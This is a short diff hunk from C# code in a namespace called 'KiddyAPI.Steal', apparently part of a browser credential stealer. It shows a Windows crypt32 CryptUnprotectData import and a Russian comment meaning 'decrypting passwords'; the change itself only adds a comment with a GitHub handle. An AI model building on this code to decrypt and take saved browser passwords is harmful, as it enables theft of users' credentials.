@@ -13,7 +13,7 @@ namespace KiddyAPI.Steal
     public class Browsers
     {
         [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-
+        //github.com/1m50rry
         private static extern bool CryptUnprotectData(ref Browsers.DataBlob pCipherText, ref string pszDescription, ref Browsers.DataBlob pEntropy, IntPtr pReserved, ref Browsers.CryptprotectPromptstruct pPrompt, int dwFlags, ref Browsers.DataBlob pPlainText);
         /// <summary>
         /// Расшифровка паролей
